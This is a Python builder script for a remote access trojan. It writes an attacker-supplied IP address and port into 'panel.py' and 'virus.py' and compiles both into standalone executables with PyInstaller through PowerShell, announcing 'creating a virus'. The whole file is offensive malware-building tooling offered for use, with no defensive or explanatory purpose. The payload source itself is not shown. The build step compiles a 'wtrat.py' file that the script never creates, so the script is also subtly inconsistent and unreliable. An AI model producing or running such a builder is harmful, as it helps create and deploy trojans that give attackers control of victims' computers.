import random
import argparse
import shutil
import subprocess
import os
from assets.font.font import *

print(random.choice(Font), "\n\n")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-lh", "--localhost", dest="localhost",required=True, help="use to specify localhost")
    parser.add_argument("-p", "--port", dest="port",required=True, help="use to specify the port")
    return parser.parse_args()

args = main()

if not os.path.exists("dist"):
    os.makedirs("dist")
else:
    shutil.rmtree("dist")
    os.makedirs("dist")

print("creating a virus...\n")

shutil.copy("panel.py", "dist")
shutil.copy("virus.py", "dist")

with open("dist/panel.py", "r+") as panel:
    lines = panel.readlines()
    print("creating panel.py...")
    lines.insert(2, f"ip = '{args.localhost}'\n")
    lines.insert(3, f"port = {args.port}\n")
    panel.seek(0)
    panel.writelines(lines)
    panel.truncate()
    print("panel.py created\n")

with open("dist/virus.py", "r+") as virus:
    lines = virus.readlines()
    print("creating virus.py...")
    lines.insert(3, f"ip = '{args.localhost}'\n")
    lines.insert(4, f"port = {args.port}\n")
    virus.seek(0)
    virus.writelines(lines)
    virus.truncate()
    print("virus.py created\n")

panelexe = "pyinstaller --onefile ./dist/panel.py"
panel = subprocess.run(["powershell", "-Command", panelexe], capture_output=True, text=True)

virusexe = "pyinstaller --onefile ./dist/wtrat.py"
virus = subprocess.run(["powershell", "-Command", virusexe], capture_output=True, text=True)

print("everything is ready")